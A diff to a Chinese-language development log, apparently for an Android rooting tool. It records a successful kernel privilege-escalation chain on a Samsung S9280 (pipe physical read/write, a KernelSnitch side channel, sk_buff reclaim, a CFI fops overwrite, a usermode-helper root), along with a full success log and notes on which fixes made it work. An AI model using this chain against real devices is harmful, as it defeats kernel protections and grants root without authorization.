@@ -396,3 +396,39 @@ S9280 (Snapdragon 8 Gen 3, nr_cpu_ids=32, possible=8)：8 核全在线时 2048=2
 **v10 修复**（commit ab6b852）：回退 pipe.c 的 leak_memfd 时序到泄漏前 close（v7 行为），**保留** v9 的 main.c CFI 重试（5 次/进程）。泄漏页类型问题（LRU 页）仍未解决，但先恢复 CFI 触发成功率，再处理泄漏页。
 
 **待验证**：`RootMyS24-debug-BYH7-pipe-gate-v10.apk`（payload md5 `f697e9fb`）。
+
+---
+
+## 13. ✅ CZA1 港版真机 Root 成功（2026-08-23 23:51）
+
+**日志**：`rootmys9280-SM-S9280 (7).txt`（hashfix 载荷，payload cza1 SHA256 `03f11ba6`）
+
+**完整成功链（attempt 2/30）**：
+```
+[*] fresh physrw pipe page=ffffff8871670000
+[*] mm leaked=ffffff8a52878000 base=ffffff8a52878000 object_index=0
+[*] S928 bank bucket=0 lock=0xea0 task=0x6000 mode=0
+[*] sk_buff reclaim sends=16/16 mode=0
+[*] kernel page prepare mode=0 attempt=2/2 base=ffffff8a52878000
+[*] app fops slide route ... delay=70000
+[+] slide child context route=pselect pid=15755
+[*] stage=verifying-kernel-access
+[*] cfi write ret=35 errno=0
+[*] cfi read ret=35 errno=0
+[*] cfi restoring misc_fops target=ffffff802a38fbf0 value=ffffffc00941e7b0
+[*] pipe page idx=0 page=ffffff8871670000 ... cache18=ffffff8001cf6800 match=1
+[*] phys step read64 done ok=1 value=306365737562656e
+[*] root umh queued wq=ffffff8001cf9c00 pwq=ffffff8800b0a800 pool=ffffff80629f7800 work=ffffff8a5287e000
+[*] root umh result wake=1 complete=1 retval=0 socket=1
+[*] app fops slide attempt=1/1 triggered=1 verified=1 step=0 errno=0
+[+] pipe physrw done=1 root=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
+✔ 临时 root 已获得！  →  KernelSU late-load exit=0 → 🎉 Root 流程完成！
+```
+
+**确认**：futex_hashsize roundup_pow2 修复（section 12）是 CZA1 突破 KernelSnitch 的关键；
+attempt 1 的 `sk_buff page leak failed` 是 KernelSnitch 正常概率性失败（collision 时序），
+attempt 2 命中即全链通过。CFI 触发竞态在 CZA1 上同样需要多 attempt（(4).txt 连续
+triggered=0 是竞态未命中，非崩溃——对比 (3).txt 曾有 panic 自动重启，属于触发命中后
+内核写坏的概率事件，多跑即可）。
+
+**CZA1 港版适配完成**：One UI 8.0 / Android 16 / kernel 6.1.128 真机 root 验证通过。
